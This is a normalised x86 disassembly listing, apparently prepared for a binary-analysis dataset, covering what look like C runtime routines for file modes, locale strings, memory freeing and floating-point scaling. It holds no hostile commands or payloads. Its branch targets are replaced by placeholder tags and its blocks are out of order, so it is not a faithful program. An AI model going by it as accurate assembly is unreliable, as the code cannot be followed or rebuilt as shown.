pop ebp
retn
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or eax 0xffffffff
pop ebp
retn
sub_4391a3
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
sar eax 0x5
lea edx [ eax * 4 + rw-data ]
mov ecx [ edx ]
and esi 0x1f
shl esi 0x6
add ecx esi
mov al [ ecx + 0x24 ]
add al al
push edi
movzx edi [ ecx + 0x4 ]
movsx eax al
and edi 0x80
sar eax 0x1
cmp ebx 0x4000
je r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
and [ ecx ] 0x80
cmp ebx 0x8000
je r-xdata
neg eax
sbb eax eax
and eax 0xc000
add eax 0x4000
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and [ ecx + 0x4 ] 0x7f
jmp r-xdata
cmp ebx 0x10000
je r-xdata
test edi edi
pop edi
pop esi
pop ebx
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x82
or dl 0x2
jmp r-xdata
cmp ebx 0x20000
je r-xdata
mov [ ecx ] dl
jmp r-xdata
cmp ebx 0x40000
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x81
or dl 0x1
sub_43925e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
push 0x16
pop eax
pop ebp
retn
sub_43928b
push 0x10
push r--data
call sub_43f8e0
mov eax [ ebp + 0xc ]
cmp eax 0x4000
je r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
cmp eax 0x8000
je r-xdata
test ebx ebx
js r-xdata
call sub_43c04c
mov [ eax ] 0x9
jmp r-xdata
cmp eax 0x10000
je r-xdata
call sub_43c04c
mov [ eax ] 0x9
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
or eax 0xffffffff
jmp r-xdata
cmp eax 0x40000
je r-xdata
call sub_43f8c5
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
call sub_43f925
retn
cmp eax 0x20000
je r-xdata
push ebx
call sub_442e0b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43c04c
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0xc ]
push ebx
call sub_4391a3
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43936e
mov eax [ ebp - 0x1c ]
sub_439376
mov edi edi
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
retn
test eax eax
je r-xdata
cmp eax esi
je r-xdata
push edi
push 0x36
pop ecx
mov edi eax
[ edi ] [ esi ]
and [ eax ] 0x0
push eax
call sub_441ed7
pop ecx
pop edi
sub_43939c
push 0x8
push r--data
call sub_43f8e0
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_43f925
retn
push 0xd
call sub_442c68
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_439449
cmp [ esi ] 0x0
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax 0xbaadf00d
mov [ esi ] eax
mov [ esi + 0x4 ] eax
push esi
call sub_4381f8
pop ecx
push 0xc
call sub_442c68
pop ecx
mov [ ebp - 0x4 ] 0x1
push [ esi ]
call sub_441f66
pop ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_439455
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_4381f8
pop ecx
cmp eax rw-data
je r-xdata
push eax
call sub_441fff
pop ecx
sub_43945e
mov edi edi
push ebp
mov ebp esp
push ebx
push edi
xor ebx ebx
xor edi edi
cmp [ ebp + 0x10 ] ebx
jle r-xdata
pop edi
pop ebx
pop ebp
retn
push esi
lea esi [ ebp + 0x10 ]
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_43f873
int3
inc edi
cmp edi [ ebp + 0x10 ]
jl r-xdata
add esi 0x4
push [ esi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_444317
add esp 0xc
test eax eax
jne r-xdata
pop esi
sub_43949f
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0x90
xor ebx ebx
push ebx
push edi
call sub_43a820
mov esi [ ebp + 0xc ]
mov al [ esi ]
add esp 0xc
test al al
jne r-xdata
cmp al 0x2e
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
mov [ ebp + 0xc ] ebx
call sub_438ca0
cmp eax ebx
jmp r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
pop ecx
pop ecx
jne r-xdata
push 0xf
push eax
lea eax [ edi + 0x80 ]
push 0x10
push eax
call sub_444384
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] 0x0
lea edi [ eax + esi ]
mov bl [ edi ]
jne r-xdata
or eax 0xffffffff
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ edi + 0x8f ] bl
jmp r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp bl 0x2e
je r-xdata
cmp eax 0x10
jae r-xdata
cmp bl 0x5f
je r-xdata
push eax
push esi
push 0x40
push [ ebp + 0x8 ]
jmp r-xdata
test bl bl
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x40
add eax 0x40
jmp r-xdata
call sub_444384
add esp 0x10
test eax eax
jne r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x10
sub eax 0xffffff80
cmp bl 0x2c
jne r-xdata
push eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
cmp bl 0x2c
je r-xdata
call sub_43f873
test bl bl
je r-xdata
inc [ ebp + 0xc ]
lea esi [ edi + 0x1 ]
push r--data
push esi
call sub_438ca0
test eax eax
sub_4395be
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43f118
add esp 0xc
xor ebx ebx
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_43f873
int3
lea eax [ esi + 0x40 ]
cmp [ eax ] bl
je r-xdata
lea eax [ esi + 0x80 ]
cmp [ eax ] bl
pop esi
pop ebx
je r-xdata
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43945e
add esp 0x14
pop ebp
retn
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43945e
add esp 0x14
sub_439629
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
inc ebx
push 0x355
mov [ ebp - 0xc ] ebx
call sub_43ddd2
pop ecx
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
pop ebx
leave
retn
push edi
lea edi [ eax + 0x4 ]
mov [ edi ] 0x0
mov [ eax ] ebx
push [ esi + 0x58 ]
mov ebx 0x351
push r--data
push [ r--data ]
push 0x3
push ebx
push edi
call sub_43945e
lea eax [ esi + 0x58 ]
add esp 0x18
mov [ ebp - 0x4 ] r--data
mov [ ebp - 0x8 ] eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_43f873
mov eax [ ebp - 0x8 ]
lea ecx [ eax + 0x10 ]
push [ ecx ]
mov [ ebp - 0x8 ] ecx
push [ eax ]
call sub_43b970
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
cmp eax ebx
je r-xdata
push eax
call edi
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
push [ eax ]
add [ ebp - 0x4 ] 0xc
push r--data
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
push [ eax ]
push 0x3
push ebx
push edi
call sub_43945e
add esp 0x18
cmp [ ebp - 0x4 ] r--data
jl r-xdata
and [ ebp - 0xc ] 0x0
mov eax [ esi + 0x68 ]
mov [ esi + 0x54 ] ebx
mov [ esi + 0x4c ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x48 ] ebx
push eax
call edi
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_4381f8
pop ecx
push r--data
push ebx
push edi
call sub_444317
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push [ esi + 0x54 ]
call sub_4381f8
pop ecx
push [ ebp - 0x10 ]
call sub_4381f8
mov eax [ esi + 0x50 ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov ebx [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
test eax eax
je r-xdata
push eax
call ebx
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
and [ esi + 0x54 ] 0x0
and [ esi + 0x4c ] 0x0
mov [ esi + 0x50 ] eax
mov [ esi + 0x48 ] edi
mov eax edi
jmp r-xdata
push eax
call ebx
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_4381f8
pop ecx
pop edi
push [ esi + 0x54 ]
call sub_4381f8
pop ecx
sub_43978e
mov edi edi
push ebp
mov ebp esp
sub esp 0xb4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x9c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0xa4 ] edi
mov [ ebp - 0xa0 ] eax
call sub_43ffe0
lea ecx [ eax + 0xc4 ]
mov [ ebp - 0xac ] ecx
lea ecx [ eax + 0xc8 ]
lea ebx [ eax + 0xbc ]
add eax 0x14b
mov [ ebp - 0xa8 ] ecx
mov [ ebp - 0x98 ] eax
test esi esi
je r-xdata
xor eax eax
cmp [ ebp - 0x9c ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ esi ] 0x43
jne r-xdata
push esi
call sub_43c860
mov edi 0x83
pop ecx
mov [ ebp - 0xb0 ] eax
cmp eax edi
jae r-xdata
cmp [ esi + 0x1 ] 0x0
jne r-xdata
and [ ebp - 0xb4 ] 0x0
lea eax [ ebp - 0x94 ]
push esi
push eax
call sub_43949f
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push [ ebp - 0x98 ]
call sub_43b970
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_43f118
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x94 ]
push eax
push ebx
push eax
call sub_4449c6
add esp 0xc
test eax eax
je r-xdata
xor esi esi
cmp [ ebp - 0xa4 ] esi
je r-xdata
push esi
push [ ebp - 0xa8 ]
call sub_43b970
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
test edi edi
je r-xdata
movzx eax [ ebx + 0x4 ]
mov ecx [ ebp - 0xac ]
mov [ ecx ] eax
lea eax [ ebp - 0x94 ]
push eax
push edi
push [ ebp - 0x98 ]
call sub_4395be
add esp 0xc
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0xa0 ] esi
je r-xdata
push 0x6
push ebx
push [ ebp - 0xa4 ]
call sub_43a8a0
add esp 0xc
mov eax [ ebp - 0xa0 ]
test eax eax
je r-xdata
mov [ edi ] ax
mov [ edi + 0x2 ] ax
mov [ edi + 0x4 ] ax
mov eax [ ebp - 0xb4 ]
mov esi r--data
mov eax [ ebp - 0xb0 ]
cmp eax edi
jb r-xdata
push [ ebp - 0x98 ]
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_43f118
add esp 0xc
test eax eax
jne r-xdata
push 0x4
push [ ebp - 0xac ]
push [ ebp - 0xa0 ]
call sub_43a8a0
add esp 0xc
mov eax [ ebp - 0x9c ]
jmp r-xdata
and [ eax ] 0x0
inc eax
push eax
push esi
push edi
push [ ebp - 0xa8 ]
call sub_444384
add esp 0x10
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
jmp r-xdata
mov eax [ ebp - 0x98 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_437c1c
leave
retn
call sub_43f873
sub_4399af
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx ecx
push edi
mov [ ebp - 0x190 ] ebx
mov [ ebp - 0x198 ] eax
call sub_43ffe0
mov edi eax
push ebx
lea eax [ ebp - 0x1a4 ]
push eax
lea eax [ ebp - 0x1b0 ]
push eax
push 0x83
lea eax [ ebp - 0x88 ]
push eax
push [ ebp - 0x198 ]
call sub_43978e
add esp 0x18
test eax eax
jne r-xdata
shl ebx 0x4
add ebx esi
push [ ebx + 0x48 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_43b970
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
lea eax [ ebp - 0x88 ]
push eax
call sub_43c860
add eax 0x5
push eax
mov [ ebp - 0x18c ] eax
call sub_43ddd2
pop ecx
pop ecx
mov [ ebp - 0x194 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x48 ]
jmp r-xdata
mov eax [ ebx + 0x48 ]
mov ecx [ ebp - 0x190 ]
mov [ ebp - 0x198 ] eax
lea eax [ esi + ecx * 4 + 0xc ]
mov [ ebp - 0x1a8 ] eax
mov eax [ eax ]
mov [ ebp - 0x1b8 ] eax
lea eax [ ecx + 0x6 ]
imul eax eax 0x6
add eax esi
push 0x6
push eax
mov [ ebp - 0x19c ] eax
lea eax [ ebp - 0x1c8 ]
push eax
call sub_43a8a0
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x88 ]
push ecx
mov ecx [ ebp - 0x18c ]
mov [ ebp - 0x1b4 ] eax
mov eax [ ebp - 0x194 ]
add ecx 0xfffffffc
add eax 0x4
push ecx
push eax
call sub_43f118
add esp 0x18
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_437c1c
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_43f873
int3
mov eax [ ebp - 0x194 ]
mov ecx [ ebp - 0x1a8 ]
add eax 0x4
mov [ ebx + 0x48 ] eax
movzx eax [ ebp - 0x1b0 ]
mov [ ecx ] eax
push 0x6
lea eax [ ebp - 0x1b0 ]
push eax
push [ ebp - 0x19c ]
call sub_43a8a0
add esp 0xc
cmp [ ebp - 0x190 ] 0x2
jne r-xdata
cmp [ ebp - 0x190 ] 0x1
jne r-xdata
mov eax [ ebp - 0x1a4 ]
and [ ebp - 0x18c ] 0x0
mov [ esi + 0x4 ] eax
mov eax [ edi + 0x1f4 ]
mov ecx [ edi + 0x1f0 ]
mov [ ebp - 0x19c ] eax
lea eax [ edi + 0x1d0 ]
mov eax [ ebp - 0x190 ]
imul eax eax 0xc
push esi
call [ eax + r--data ]
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x1a4 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x18c ]
test eax eax
je r-xdata
mov edx [ eax ]
inc [ ebp - 0x18c ]
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ ebp - 0x1c0 ] edx
mov edx [ eax + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x1c0 ]
add eax 0x8
cmp [ ebp - 0x18c ] 0x5
mov [ ebp - 0x19c ] edx
jl r-xdata
cmp [ ebp - 0x198 ] rw-data
je r-xdata
mov eax [ ebp - 0x198 ]
push [ ebp - 0x194 ]
mov [ ebx + 0x48 ] eax
call sub_4381f8
mov eax [ ebp - 0x1b8 ]
pop ecx
mov ecx [ ebp - 0x1a8 ]
mov [ ecx ] eax
mov eax [ ebp - 0x1b4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x18c ] 0x5
jne r-xdata
lea eax [ edi + eax * 8 + 0x1d0 ]
mov edx [ eax ]
mov [ edi + 0x1d0 ] edx
mov edx [ eax + 0x4 ]
mov [ edi + 0x1d4 ] edx
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ eax + 0x4 ] ecx
mov edx [ esi + 0x4 ]
cmp edx [ eax ]
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x190 ]
mov eax [ ebp - 0x194 ]
add ecx 0x5
add ecx ecx
mov [ eax ] 0x1
mov [ esi + ecx * 8 ] eax
jmp r-xdata
mov edi [ ebp - 0x190 ]
add edi 0x5
add edi edi
push [ esi + edi * 8 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ edi + 0x1d4 ]
mov [ esi + 0xa8 ] eax
push 0x1
push [ esi + 0x14 ]
lea eax [ ebp - 0x188 ]
push [ esi + 0x4 ]
push eax
push 0x7f
push r--data
push 0x1
push 0x0
call sub_4461f2
add esp 0x20
test eax eax
je r-xdata
push [ esi + edi * 8 ]
call sub_4381f8
push [ ebx + 0x54 ]
call sub_4381f8
and [ ebx + 0x4c ] 0x0
pop ecx
pop ecx
and [ edi + 0x1d4 ] 0x0
xor eax eax
mov ecx 0x1ff
and [ ebp + eax * 2 - 0x188 ] cx
inc eax
cmp eax 0x7f
jb r-xdata
push 0xfe
push [ rw-data ]
lea eax [ ebp - 0x188 ]
push eax
call sub_444bb7
add esp 0xc
neg eax
sbb eax eax
inc eax
mov [ edi + 0x1d4 ] eax
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x1d0 ] eax
sub_439ce9
mov edi edi
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi edx
push edi
mov [ ebp - 0x98 ] esi
cmp ecx ebx
je r-xdata
mov [ ebp - 0x90 ] 0x1
mov [ ebp - 0x8c ] ebx
cmp eax ebx
je r-xdata
cmp eax ebx
je r-xdata
call sub_439629
cmp [ eax ] 0x4c
jne r-xdata
add ecx ecx
mov eax [ esi + ecx * 8 + 0x48 ]
jmp r-xdata
push eax
call sub_4399af
pop ecx
jmp r-xdata
push ebx
push ebx
push ebx
push 0x83
lea ecx [ ebp - 0x88 ]
push ecx
push eax
call sub_43978e
add esp 0x18
cmp eax ebx
je r-xdata
cmp [ eax + 0x1 ] 0x43
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_437c1c
leave
retn
lea edi [ esi + 0x48 ]
cmp [ eax + 0x2 ] 0x5f
jne r-xdata
inc ebx
add edi 0x10
cmp ebx 0x5
jle r-xdata
push [ edi ]
lea eax [ ebp - 0x88 ]
push eax
call sub_43b970
pop ecx
pop ecx
test eax eax
je r-xdata
mov edi eax
test ebx ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x90 ] eax
jne r-xdata
inc [ ebp - 0x8c ]
lea eax [ ebp - 0x88 ]
push eax
mov ecx ebx
call sub_4399af
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
sub eax edi
mov [ ebp - 0x90 ] eax
je r-xdata
cmp [ ebp - 0x8c ] eax
je r-xdata
and [ ebp - 0x90 ] eax
jmp r-xdata
cmp [ ebx ] 0x3b
je r-xdata
mov [ ebp - 0x94 ] 0x1
mov esi r--data
jmp r-xdata
push eax
push edi
push [ esi ]
call sub_446232
add esp 0xc
test eax eax
jne r-xdata
inc [ ebp - 0x94 ]
add esi 0xc
cmp esi r--data
jle r-xdata
push [ esi ]
call sub_43c860
pop ecx
cmp [ ebp - 0x90 ] eax
je r-xdata
mov eax [ ebp - 0x90 ]
inc ebx
push r--data
push ebx
call sub_438ca0
mov edi eax
xor esi esi
pop ecx
pop ecx
cmp edi esi
jne r-xdata
cmp [ ebp - 0x94 ] 0x5
jg r-xdata
cmp [ ebx ] 0x3b
jne r-xdata
add edi ebx
cmp [ edi ] 0x0
je r-xdata
push edi
push ebx
lea eax [ ebp - 0x88 ]
push 0x83
push eax
call sub_444384
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
cmp [ ebp - 0x8c ] eax
je r-xdata
inc edi
cmp [ edi ] 0x0
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_43f873
mov ecx [ ebp - 0x94 ]
mov esi [ ebp - 0x98 ]
mov [ ebp + edi - 0x88 ] al
lea eax [ ebp - 0x88 ]
push eax
call sub_4399af
pop ecx
test eax eax
je r-xdata
mov esi [ ebp - 0x98 ]
jmp r-xdata
push r--data
push edi
call sub_446300
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
inc [ ebp - 0x8c ]
sub_439f05
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x5
push esi
push edi
ja r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor edi edi
inc edi
push edi
push 0x8
call sub_43de17
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
push edi
push 0xd8
call sub_43de17
pop ecx
pop ecx
mov [ esi ] eax
test eax eax
jne r-xdata
call sub_43c04c
mov [ eax ] 0xc
push edi
push 0x220
call sub_43de17
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
jne r-xdata
push esi
call sub_4381f8
mov eax [ esi ]
mov ecx rw-data
call sub_439376
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx [ esi ]
call sub_439ce9
pop ecx
test eax eax
jne r-xdata
push [ esi ]
call sub_4381f8
push esi
call sub_4381f8
pop ecx
jmp r-xdata
push [ esi + 0x4 ]
mov eax [ esi ]
push [ eax + 0x4 ]
call sub_442553
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi ]
call sub_441f66
push [ esi ]
call sub_441fff
push esi
call sub_4381f8
add esp 0xc
jmp r-xdata
pop ecx
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ eax ] edi
mov eax [ esi + 0x4 ]
mov [ eax ] edi
push [ esi + 0x4 ]
call sub_4381f8
push [ esi ]
call sub_441f66
push [ esi ]
call sub_441fff
push esi
call sub_4381f8
add esp 0x10
xor esi esi
jmp r-xdata
pop edi
pop esi
pop ebp
retn
mov eax esi
jmp r-xdata
sub_439ffd
push 0x14
push r--data
call sub_43f8e0
and [ ebp - 0x20 ] 0x0
cmp [ ebp + 0x8 ] 0x5
jbe r-xdata
call sub_43ffe0
mov esi eax
mov [ ebp - 0x1c ] esi
call sub_442197
or [ esi + 0x70 ] 0x10
and [ ebp - 0x4 ] 0x0
xor edi edi
inc edi
push edi
push 0xd8
call sub_43de17
pop ecx
pop ecx
mov ebx eax
mov [ ebp - 0x24 ] ebx
test ebx ebx
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43a16c
mov eax [ ebp - 0x20 ]
push 0xc
call sub_442c68
pop ecx
mov [ ebp - 0x4 ] edi
mov ecx [ esi + 0x6c ]
mov eax ebx
call sub_439376
and [ ebp - 0x4 ] 0x0
call sub_43a12f
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx ebx
call sub_439ce9
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
call sub_43f925
retn
push ebx
call sub_441f66
push ebx
call sub_441fff
pop ecx
pop ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0xc
call sub_442c68
pop ecx
mov [ ebp - 0x4 ] 0x2
lea edi [ esi + 0x6c ]
push ebx
push edi
call sub_44214a
push ebx
call sub_441f66
add esp 0xc
test [ esi + 0x70 ] 0x2
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call sub_43b970
pop ecx
pop ecx
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_43a13b
jmp r-xdata
test [ rw-data ] 0x1
jne r-xdata
mov [ rw-data ] edi
push [ edi ]
push rw-data
call sub_44214a
pop ecx
pop ecx
mov eax [ rw-data ]
mov ecx [ eax + 0xbc ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xc8 ]
mov [ rw-data ] ecx
mov eax [ eax + 0xac ]
mov [ rw-data ] eax
sub_43a192
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push edi
mov esi 0xffff
push esi
push 0x133f
call sub_446db7
fld [ ebp + 0x8 ]
pop ecx
pop ecx
movzx ecx [ ebp + 0xe ]
mov edi eax
mov eax 0x7ff0
and ecx eax
cmp cx ax
jne r-xdata
fldz
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
push ecx
push ecx
fstp [ esp ]
call sub_446549
pop ecx
pop ecx
test eax eax
jle r-xdata
push esi
push edi
call sub_446db7
pop ecx
pop ecx
jmp r-xdata
fld [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_4465af
mov eax [ ebp + 0x10 ]
mov ecx [ ebp - 0x4 ]
add esp 0xc
test eax eax
jns r-xdata
fld [ ebp + 0x8 ]
push edi
fadd [ r--data ]
sub esp 0x18
fstp [ esp + 0x10 ]
fild [ ebp + 0x10 ]
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
push 0x8
cmp eax 0x2
jle r-xdata
fld [ ebp + 0x8 ]
mov edx 0x7fffffff
sub edx eax
cmp ecx edx
jg r-xdata
mov edx 0x80000000
sub edx eax
cmp ecx edx
jl r-xdata
pop edi
pop esi
leave
retn
cmp eax 0x3
jne r-xdata
push edi
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ rw-data ]
fstp [ esp ]
call sub_446672
fstp [ esp + 0x8 ]
fild [ ebp + 0x10 ]
fstp [ esp ]
push ecx
push ecx
add eax ecx
cmp eax 0xa00
jle r-xdata
fmul [ r--data ]
jmp r-xdata
fild [ ebp + 0x10 ]
push edi
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
call sub_446c5b
add esp 0x18
jmp r-xdata
call sub_446cbc
add esp 0x24
jmp r-xdata
cmp eax 0x400
jle r-xdata
cmp eax 0xfffff603
jge r-xdata
add eax 0xfffffa00
push eax
push ecx
push ecx
fstp [ esp ]
call sub_44651c
add esp 0xc
push edi
sub esp 0x18
fstp [ esp + 0x10 ]
fild [ ebp + 0x10 ]
fstp [ esp + 0x8 ]
jmp r-xdata
cmp eax 0xfffffc03
jge r-xdata
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
push 0x11
jmp r-xdata
push eax
push ecx
push ecx
fstp [ esp ]
call sub_44651c
push esi
fstp [ ebp + 0x8 ]
push edi
call sub_446db7
add esp 0x14
add eax 0x600
push eax
push ecx
push ecx
fstp [ esp ]
call sub_44651c
add esp 0xc
jmp r-xdata
push edi
sub esp 0x18
fstp [ esp + 0x10 ]
fild [ ebp + 0x10 ]
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
push 0x12
jmp r-xdata
sub_43a344
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
and [ ebp - 0x20 ] 0x0
push edi
push 0x7
pop ecx
xor eax eax
lea edi [ ebp - 0x1c ]
[ edi ]
pop edi
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or eax 0xffffffff
leave
retn
push esi
call sub_43c860
pop ecx
mov ecx 0x7fffffff
mov [ ebp - 0x14 ] 0x49
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] ecx
cmp eax ecx
ja r-xdata
push [ ebp + 0x14 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
leave
retn
mov [ ebp - 0x1c ] eax
sub_43a3b2
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp + 0x10 ]
push eax
push 0x0
push [ ebp + 0xc ]
push sub_446f63
call sub_43a344
add esp 0x10
pop esi
pop ebp
retn
sub_43a3d4
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
call sub_438ce6
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
test eax eax
je r-xdata
test esi esi
jne r-xdata
mov [ eax ] esi
